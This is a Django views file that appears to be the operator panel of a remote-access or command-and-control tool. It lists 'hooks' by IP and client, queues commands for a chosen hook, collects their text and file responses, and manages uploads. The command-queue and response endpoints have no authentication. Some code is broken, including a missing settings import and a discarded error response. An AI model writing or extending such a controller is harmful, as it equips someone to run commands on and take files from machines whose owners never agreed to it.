from django.shortcuts import render, get_object_or_404, redirect
import socket
import os
import json
import ssl
import threading
import traceback
import sys
from main.models import *
from django.http import HttpResponse
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib.auth.decorators import login_required
import time
import psutil
from .forms import *

def home(request):
    try:
        server = Server.objects.first()
        if server is not None and server.running:
            running = "Online"
        else:
            running = "Offline"
    except Server.DoesNotExist:
        running = "Offline"
    count = Hook.objects.count()
    context = {'count': count, 'running':running}
    return render(request, 'main/home.html', context)

@login_required
def hooks(request):
    context = {'ips': IP.objects.all(), 'clients': Client.objects.all(), 'hooks': Hook.objects.all()}
    return render(request, 'main/hooks.html', context)

@login_required
def hook(request, slug):
    try:
        ip = IP.objects.get(uuid=slug)
        hook = ip.hook
        context = {'hook': hook}
        return render(request, 'main/client.html', context)
    except:
        HttpResponse("No client found")
    

def create_command(request):
    if request.method == 'POST':
        command_text = request.POST.get('command')
        hook_uuid = request.POST.get('uuid')

        hook = get_object_or_404(Hook, uuid=hook_uuid)
        command = Command(command=command_text, hook=hook)
        command.save()

        return JsonResponse({'processed': command.processed, 'id': command.pk})
    
def command_response(request, pk):
    command = get_object_or_404(Command, pk=pk)
    if not command.processed:
        return JsonResponse({'msg': 'not-processed'})
    
    return JsonResponse({'response': command.response, 'file': command.file_response.url if command.file_response else None, 'processed': command.processed})
    
@login_required
def restart(request):
    if request.method == 'POST':
        server = Server.objects.get()
        server.restart = True
        server.save()
        time.sleep(2)
        return redirect('hooks')
    return render(request, 'main/restart.html')

def faq(request):
    return render(request, 'main/faq.html')

@login_required
def account(request):
    user = request.user
    context = {'user': user}
    return render(request, 'main/account.html', context)

@login_required
def uploads(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)
        if form.is_valid():
            new_file = FileUpload(file = request.FILES['file'])
            new_file.user = request.user
            new_file.filetype = request.FILES['file'].content_type
            new_file.save()
            return redirect('uploads')
    else:
        form = UploadFileForm()
    user = request.user
    print(os.path.join(settings.MEDIA_ROOT, 'user_files\\'))
    uploads = FileUpload.objects.all()
    context = {'uploads': uploads, 'form': form}
    return render(request, 'main/uploads.html', context)

@login_required
def delete_file(request, file_id):
    file = get_object_or_404(FileUpload, id=file_id)
    if request.user == file.user:
        file_path = os.path.join(settings.MEDIA_ROOT, file.file.path)
        file.delete()
        if os.path.exists(file_path):
            os.remove(file_path)
    return redirect('uploads')